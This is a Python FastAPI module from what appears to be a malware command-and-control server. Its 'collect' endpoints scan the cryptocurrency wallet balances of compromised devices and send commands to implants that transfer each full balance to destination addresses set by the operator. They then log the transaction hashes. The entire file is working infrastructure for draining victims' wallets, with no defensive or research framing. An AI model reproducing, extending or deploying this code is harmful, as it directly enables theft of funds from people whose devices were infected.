"""
Collect operations — dispatch real collect commands to implants and record results.
"""

from __future__ import annotations

import time
import uuid
from typing import Any, Optional

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from .audit import audit
from .collect_catalog import COLLECT_ASSETS
from .database import (
    get_collect_addresses,
    get_device_asset_rows_for_scan,
    save_collect_record,
)
from .state import C2Command, app_state

router = APIRouter(tags=["Collect Ops"])


class CollectExecuteRequest(BaseModel):
    device_id: str = ""
    scan_first: bool = True
    asset_ids: list[str] = []


async def _dispatch_collect(session_id: str, cmd_args: dict) -> str:
    command = C2Command(
        id=uuid.uuid4().hex[:12],
        timestamp=time.time(),
        cmd="collect",
        args=cmd_args,
        status="pending",
    )
    app_state.command_history.append(command)
    session = app_state.implant_sessions.get(session_id)
    if not session:
        raise HTTPException(404, f"Session {session_id} not online")
    session.command_queue.append(command)
    await app_state.broadcast_sse({
        "type": "command_dispatch",
        "data": {
            "command_id": command.id,
            "cmd": "collect",
            "args": cmd_args,
            "targets": [session_id],
            "target_device": cmd_args.get("device_id", ""),
        },
    })
    return command.id


def _build_collect_jobs(row: dict, destinations: dict, asset_filter: set[str]) -> list[dict]:
    jobs = []
    for asset in COLLECT_ASSETS:
        aid = asset["id"]
        if asset_filter and aid not in asset_filter:
            continue
        dest = destinations.get(asset["dest_key"], "")
        wallet = row.get(asset["wallet_key"], "")
        balance = float(row.get(asset["balance_key"], 0) or 0)
        if not dest or not wallet or balance <= 0:
            continue
        jobs.append({
            "asset_id": aid,
            "chain": asset["chain"],
            "token": asset["token"],
            "label": asset["label"],
            "amount": balance,
            "from_address": wallet,
            "to_address": dest,
        })
    return jobs


async def execute_collect_for_devices(
    device_id: str = "",
    *,
    scan_first: bool = True,
    asset_ids: Optional[list[str]] = None,
) -> dict[str, Any]:
    destinations = get_collect_addresses()
    if not any(destinations.get(a["dest_key"]) for a in COLLECT_ASSETS):
        raise HTTPException(400, "Configure collect destination addresses first")

    if scan_first:
        from .chain_scanner import scan_all_device_balances, scan_device_balances
        if device_id:
            await scan_device_balances(device_id)
        else:
            await scan_all_device_balances()

    asset_filter = set(asset_ids or [])
    rows = get_device_asset_rows_for_scan(device_id or None)
    dispatched = []
    skipped = []

    for row in rows:
        if not row.get("collectable"):
            skipped.append({"device_id": row["device_id"], "reason": "not collectable"})
            continue
        session_id = row.get("session_id", "")
        if not session_id or session_id not in app_state.implant_sessions:
            skipped.append({"device_id": row["device_id"], "reason": "implant offline"})
            continue

        jobs = _build_collect_jobs(row, destinations, asset_filter)
        if not jobs:
            skipped.append({"device_id": row["device_id"], "reason": "zero balance or missing wallet/dest"})
            continue

        for item in jobs:
            record_id = f"COL-{uuid.uuid4().hex[:10]}"
            save_collect_record({
                "record_id": record_id,
                "device_id": row["device_id"],
                "chain": item["asset_id"],
                "amount": item["amount"],
                "tx_hash": "",
                "status": "pending",
                "created_at": time.time(),
            })
            cmd_id = await _dispatch_collect(session_id, {
                "device_id": row["device_id"],
                "record_id": record_id,
                **item,
            })
            dispatched.append({
                "device_id": row["device_id"],
                "record_id": record_id,
                "command_id": cmd_id,
                "asset_id": item["asset_id"],
                "amount": item["amount"],
            })

    audit("execute_collect", "collect:execute", detail=f"dispatched={len(dispatched)}")
    await app_state.broadcast_sse({
        "type": "collect_executed",
        "data": {"dispatched": len(dispatched), "skipped": len(skipped)},
    })
    return {
        "dispatched": dispatched,
        "skipped": skipped,
        "dispatched_count": len(dispatched),
    }


def record_collect_result(body: dict[str, Any]) -> Optional[dict]:
    record_id = str(body.get("record_id", ""))
    tx_hash = str(body.get("tx_hash", ""))
    status = str(body.get("status", "confirmed"))
    device_id = str(body.get("device_id", ""))
    chain = str(body.get("asset_id") or body.get("chain", ""))
    amount = float(body.get("amount", 0) or 0)

    if record_id:
        from .database import _get_conn
        conn = _get_conn()
        conn.execute(
            "UPDATE collect_records SET tx_hash = ?, status = ? WHERE record_id = ?",
            (tx_hash, status, record_id),
        )
        conn.commit()
        return {"record_id": record_id, "tx_hash": tx_hash, "status": status}

    if not device_id or not chain:
        return None

    new_id = f"COL-{uuid.uuid4().hex[:10]}"
    save_collect_record({
        "record_id": new_id,
        "device_id": device_id,
        "chain": chain,
        "amount": amount,
        "tx_hash": tx_hash,
        "status": status,
        "created_at": time.time(),
    })
    return {"record_id": new_id, "tx_hash": tx_hash, "status": status}


@router.get("/api/collect/catalog", summary="Supported collect asset types")
async def collect_catalog():
    return {"code": 0, "data": COLLECT_ASSETS}


@router.post("/api/collect/execute", summary="Execute collect for collectable devices")
async def collect_execute(body: CollectExecuteRequest):
    result = await execute_collect_for_devices(
        body.device_id,
        scan_first=body.scan_first,
        asset_ids=body.asset_ids or None,
    )
    return {"code": 0, "data": result}


@router.post("/api/collect/scan-and-execute", summary="RPC scan all wallets then collect")
async def collect_scan_and_execute(body: CollectExecuteRequest):
    body.scan_first = True
    return await collect_execute(body)
